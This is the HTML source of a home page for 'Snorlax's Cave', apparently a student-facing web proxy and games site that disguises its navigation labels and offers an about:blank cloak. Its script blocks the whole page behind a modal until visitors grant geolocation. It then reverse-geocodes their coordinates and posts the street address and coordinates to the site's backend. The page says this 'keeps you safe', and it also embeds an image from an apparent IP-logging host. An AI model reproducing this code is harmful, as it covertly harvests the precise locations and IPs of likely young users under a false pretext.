
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description"
    content="Snorlax's Cave brings your students the best learning methods and skills to help them be the best and most efficient at studying!" />
  <title>Home | Snorlax's Cave</title>
  <meta name="image" content="assets/img/icon.png">
  <link rel="icon" href="/assets/img/newlogo.png">
  <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet" />
  <meta name="sps-bot" content="true">
  <link rel="stylesheet" href="/assets/css/style.css" />
  <link rel="stylesheet" href="/assets/css/animations.css" />
  <script src="/assets/js/functions.js"></script>
</head>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZTCTYH80S1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-ZTCTYH80S1');
</script>
  
<body>
  <nav>
    <div class="heading">
       <a href="/#" class="headinglink">Snorlax's Cave</a>
    </div>
    <ul class="nav-links">
      <li><a class="active" href="/">Home</a></li>
      <li><a href="/math">Games</a></li>
      <li><a href="/english">Apps</a></li>
      <li><a href="/science">Proxy</a></li>
      <li><a href="/about">About</a></li>
      <li><a href="/settings">Settings</a></li>
    </ul>
    <div id="navbar-shade" style="display:none;position:absolute;top:0;left:0;width:100vw;height:70px;background:rgba(0,0,0,0.18);z-index:9998;"></div>
  </nav>
  <br>
  <br>
  <div class="intro" data-m="bounce-down" data-m-duration="1">
  <h1 class="large">Welcome to Snorlax's Cave!</h1>
  <img src="https://snifferip.com/the_frfr_thing.jpg" loading="eager">
  <p style="padding:20px;">Snorlax's Cave is a UV built proxy and game site (v1.0)</p>
  <div id="location-modal" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:9999;">
    <div style="background:linear-gradient(135deg,#f8fafc,#e0eafc 80%);padding:48px 36px 36px 36px;border-radius:22px;box-shadow:0 12px 40px rgba(0,0,0,0.22);text-align:center;max-width:400px;min-width:320px;position:relative;">
      <img src="/assets/img/newlogo.png" alt="Logo" style="width:70px;height:70px;margin-bottom:22px;box-shadow:0 2px 12px rgba(79,140,255,0.10);border-radius:50%;">
      <h2 style="font-family:'Montserrat',sans-serif;font-size:1.7em;color:#2d3a4a;margin-bottom:14px;">Enable Location Services</h2>
      <p style="color:#2d3a4a;font-size:1.08em;margin-bottom:22px;">To use Snorlax's Cave, you must enable location access.<br><span style="font-size:0.98em;color:#6c7a89;">Your location helps us provide services and keep you safe.</span></p>
      <button id="enable-location" style="background:linear-gradient(90deg,#4f8cff,#38c1ff);color:white;border:none;padding:14px 38px;border-radius:10px;font-size:1.08em;cursor:pointer;box-shadow:0 2px 12px rgba(79,140,255,0.18);transition:background 0.2s;outline:none;">Allow Location Access</button>
      <p id="location-error" style="color:#e74c3c;display:none;margin-top:18px;font-size:1em;"></p>
      <div style="margin-top:22px;font-size:0.95em;color:#888;">We do not share your location with third parties.</div>
    </div>
  </div>
  <a href="#" onclick="cloak()" style="text-decoration: none;color:white;"><button>about:blank</button></a>
  <a href="#" onclick="ourDiscord()" style="text-decoration: none;color:white;"><button id="discord-btn" disabled>Join our Discord</button></a>
  <a href="#" onclick="patreon()" style="text-decoration: none;color:white;"><button id="patreon-btn" disabled>SUPPORT US</button></a>
  </div>
  <script src="/assets/js/index.js"></script>
  <script src="/uv/uv.bundle.js"></script>
  <script src="/uv/uv.config.js"></script>
  <script>
    // Custom Background Check
    var bgUrl = localStorage.getItem('backgroundImage');
    if (bgUrl === 'none' || bgUrl === null || bgUrl === '') {
      document.body.style.backgroundImage = `url('/assets/img/snorlax_background.jpg')`;
    } else {
        document.body.style.backgroundImage = `url(${bgUrl})`;
    }

    // Location Modal Logic
    document.addEventListener('DOMContentLoaded', function() {
      const modal = document.getElementById('location-modal');
      const btn = document.getElementById('enable-location');
      const errorMsg = document.getElementById('location-error');
      const navbarShade = document.getElementById('navbar-shade');
      const discordBtn = document.getElementById('discord-btn');
      const patreonBtn = document.getElementById('patreon-btn');
      // Block all interaction until location enabled
      document.body.style.overflow = 'hidden';
      Array.from(document.body.children).forEach(el => {
        if (el !== modal && el !== navbarShade) el.inert = true;
      });
      navbarShade.style.display = 'block';
      btn.addEventListener('click', function(e) {
        e.preventDefault();
        btn.disabled = true;
        btn.style.opacity = '0.7';
        errorMsg.style.display = 'none';
        if (!navigator.geolocation) {
          errorMsg.textContent = 'Geolocation is not supported by your browser.';
          errorMsg.style.display = 'block';
          btn.disabled = false;
          btn.style.opacity = '1';
          return;
        }
        navigator.geolocation.getCurrentPosition(async function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          let address = '';
          try {
            // Use a free reverse geocoding API (OpenStreetMap Nominatim)
            const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
            const data = await resp.json();
            address = data.display_name || '';
          } catch (e) {
            address = '';
          }
          // Send to backend
          await fetch('/api/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address, latitude: lat, longitude: lon })
          });
          modal.style.display = 'none';
          document.body.style.overflow = '';
          Array.from(document.body.children).forEach(el => {
            if (el !== modal && el !== navbarShade) el.inert = false;
          });
          navbarShade.style.display = 'none';
          discordBtn.disabled = false;
          patreonBtn.disabled = false;
        }, function(error) {
          errorMsg.textContent = 'Error getting location: ' + error.message;
          errorMsg.style.display = 'block';
          btn.disabled = false;
          btn.style.opacity = '1';
        });
      });
    });
  </script>
  </body>
  </html>
